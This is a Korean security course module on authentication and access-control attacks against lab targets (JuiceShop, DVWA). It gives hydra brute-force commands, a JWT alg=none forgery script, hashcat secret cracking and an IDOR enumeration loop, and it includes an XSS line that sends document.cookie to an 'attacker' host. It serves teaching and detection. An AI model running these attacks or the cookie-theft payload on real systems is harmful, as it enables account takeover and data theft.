# Week 06 — OWASP A01 + A07 — 인증 + 접근제어

> A01 Broken Access Control + A07 Identification & Authentication Failures.
> hydra brute force / JWT 우회 / IDOR / session hijacking.

## 학습 목표

1. 인증 메커니즘 (Basic / Form / JWT / OAuth) 차이
2. hydra 의 sevice별 brute force
3. JWT 의 alg=none 우회
4. JWT secret brute (hashcat)
5. IDOR (Insecure Direct Object Reference)
6. session fixation / hijacking

## 1. hydra brute force

```
# SSH
hydra -l ccc -P /usr/share/wordlists/rockyou.txt 10.20.30.201 ssh -t 4

# HTTP form
hydra -l admin -P pass.txt 10.20.30.1 http-post-form \
    "/login:user=^USER^&pass=^PASS^:Invalid login" -H "Host: dvwa.6v6.lab"

# HTTP basic
hydra -l admin -P pass.txt 10.20.30.1 http-get -H "Host: target"
```

옵션:
- `-l` / `-L` : single user / list
- `-p` / `-P` : single pass / list
- `-t` : 동시 thread
- `-f` : 첫 성공 시 stop
- `-e nsr` : null/same/reverse 자동 시도

## 2. JWT alg=none 우회

```
{
  "alg": "none",          # alg 를 'none' 으로 변경
  "typ": "JWT"
}
.
{
  "user": "admin"        # 임의 페이로드
}
.                         # signature 비움
```

JWT 라이브러리 일부는 `alg: none` 을 sig 검증 없이 통과. → 누구나 admin 위장.

## 3. JWT secret brute

```
# hashcat mode 16500
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

약한 secret (예: "secret123") 사용 시 분 단위 크랙.

## 4. IDOR

```
# 정상 — 사용자 자기 데이터
GET /api/users/1/orders

# IDOR — 다른 사용자 데이터 접근
GET /api/users/2/orders
GET /api/users/3/orders
GET /api/users/4/orders
```

서버가 권한 검증 없이 URL 파라미터의 ID 신뢰. JuiceShop / NeoBank challenge.

## 5. session fixation / hijacking

```
# session ID 가 URL 에 노출 → 공유 시 hijack
http://target/?PHPSESSID=abc123

# httpOnly 없는 cookie → JS 로 도용 (XSS 결합)
<script>fetch('//attacker/'+document.cookie)</script>
```

## 6. ATT&CK

| Tactic / Technique | 매핑 |
|--------------------|------|
| TA0006 Credential Access | T1110.001 Password Guessing |
| TA0006 | T1110.003 Password Spraying |
| TA0006 | T1212 Exploitation for Credential Access |
| TA0007 Discovery | T1087.002 Domain Account |

## 7. 실습 1~5

### 1 — hydra SSH brute (제한된 wordlist)

```
ssh 6v6-attacker 'echo -e "admin\nccc\nroot\ntest" > /tmp/users.txt'
ssh 6v6-attacker 'echo -e "ccc\nadmin\npassword\n1\nletmein" > /tmp/pass.txt'
ssh 6v6-attacker 'hydra -L /tmp/users.txt -P /tmp/pass.txt -t 1 -f 10.20.30.201 ssh -s 22 2>&1 | head -10' || true
```

### 2 — JuiceShop login brute (HTTP)

```
ssh 6v6-attacker '
hydra -l "admin@juice-sh.op" -P /tmp/pass.txt 10.20.30.1 \
    https-post-form "/rest/user/login:email=^USER^&password=^PASS^:Invalid" \
    -H "Host: juice.6v6.lab" -t 1 -f 2>&1 | head -10
' || true
```

### 3 — JWT alg=none 시도

```
ssh 6v6-attacker '
# JuiceShop 의 valid JWT 받기
JWT=$(curl -s -X POST -H "Host: juice.6v6.lab" -H "Content-Type: application/json" \
    -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}" \
    http://10.20.30.1/rest/user/login | jq -r ".authentication.token // empty")
echo "JWT: ${JWT:0:50}..."

# alg=none 변조
HEADER=$(echo -n "{\"alg\":\"none\",\"typ\":\"JWT\"}" | base64 -w0 | tr "+/" "-_" | tr -d "=")
PAYLOAD=$(echo -n "{\"user\":\"admin\",\"role\":\"admin\"}" | base64 -w0 | tr "+/" "-_" | tr -d "=")
NEW_JWT="$HEADER.$PAYLOAD."
echo "변조 JWT: $NEW_JWT"
'
```

### 4 — IDOR 시도

```
ssh 6v6-attacker '
for id in 1 2 3 4 5; do
    code=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: juice.6v6.lab" \
        "http://10.20.30.1/api/Users/$id")
    echo "User $id: $code"
done
'
```

### 5 — Wazuh detection

```
ssh 6v6-siem 'sudo grep -E "5710|5712|hydra" /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -5'
```

## 8. 과제

A. brute force 보고서 (필수)
B. JWT alg=none 우회 (심화)
C. IDOR 매트릭스 (정성)

## 9. W07 (SSRF/파일업로드/경로탐색) 예고

A10 SSRF + A05 파일 업로드 + A03 path traversal.
